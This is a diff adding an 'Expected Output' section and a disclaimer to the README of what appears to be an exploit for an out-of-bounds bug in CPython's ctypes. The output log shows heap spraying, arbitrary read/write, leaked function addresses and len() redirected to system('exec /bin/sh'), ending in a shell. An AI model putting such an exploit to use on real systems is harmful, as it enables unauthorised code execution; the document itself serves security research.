@@ -51,3 +51,22 @@ cd cpython-ctypes-oob
 
 # Run the exploit
 python3 exploit.py
+
+### Expected Output
+
+```text
+[*] Spraying...
+[+] Pair found
+[+] Arb r/w active
+[+] builtin_len @ 0x7f8a1b2c3d40
+[+] system @ 0x7f8a1a987650
+[+] Command written to 0x55b1a2c3d4e0
+[*] len('x') -> system('exec /bin/sh')
+========================================
+$ id
+uid=1000(cyberstan) gid=1000(cyberstan) groups=1000(cyberstan)
+```
+
+## ⚖️ Disclaimer
+
+This code is provided for educational and security research purposes only. Do not use this against systems you do not own or have explicit permission to test.
